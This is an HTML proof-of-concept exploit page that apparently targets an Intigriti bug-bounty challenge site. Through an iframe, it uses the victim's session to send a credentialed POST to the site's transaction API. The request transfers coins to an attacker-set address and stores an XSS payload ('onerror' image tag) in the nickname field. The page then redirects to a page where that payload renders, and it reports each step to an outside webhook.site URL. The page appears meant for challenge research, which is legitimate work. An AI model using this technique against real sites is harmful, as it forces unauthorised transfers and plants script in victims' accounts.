<!DOCTYPE html>
<html>
<head><title>PoC</title></head>
<body>
<h1>XSS PoC</h1>

<!-- Webhook tracking -->
<img src="https://webhook.site/f81ce1a4-789f-4cea-b6f0-034c966c4049/?step=started">

<!-- Load dashboard in iframe to get same-origin access -->
<iframe id="f" src="https://challenge-0126.intigriti.io/dashboard.html" style="width:100%;height:400px"></iframe>

<script>
const BASE = 'https://challenge-0126.intigriti.io';
const WEBHOOK = 'https://webhook.site/f81ce1a4-789f-4cea-b6f0-034c966c4049';
const YOUR_ADDRESS = '1cc4a7735c998cb4b4e390e97c349281d2';
const XSS_PAYLOAD = '<img src=x onerror="alert(\'gigawatz\')">';

const f = document.getElementById('f');

f.onload = function() {
  new Image().src = WEBHOOK + '/?step=iframe_loaded';

  setTimeout(function() {
    try {
      // Access iframe's window and make API call from same origin
      const win = f.contentWindow;

      // Direct API call with nickname
      win.fetch('/api/transaction', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        credentials: 'include',
        body: JSON.stringify({
          toAddress: YOUR_ADDRESS,
          currency: '1337COIN',
          amount: 2,
          nickname: XSS_PAYLOAD
        })
      }).then(function(r) {
        new Image().src = WEBHOOK + '/?step=tx_status_' + r.status;

        // Redirect to marketwatch after transaction
        setTimeout(function() {
          new Image().src = WEBHOOK + '/?step=redirecting';
          window.location = BASE + '/marketwatch.html';
        }, 1000);
      }).catch(function(e) {
        new Image().src = WEBHOOK + '/?step=error_' + encodeURIComponent(e.message);
      });

      new Image().src = WEBHOOK + '/?step=api_called';

    } catch (e) {
      new Image().src = WEBHOOK + '/?step=catch_' + encodeURIComponent(e.message);
    }
  }, 2000);
};
</script>
</body>
</html>
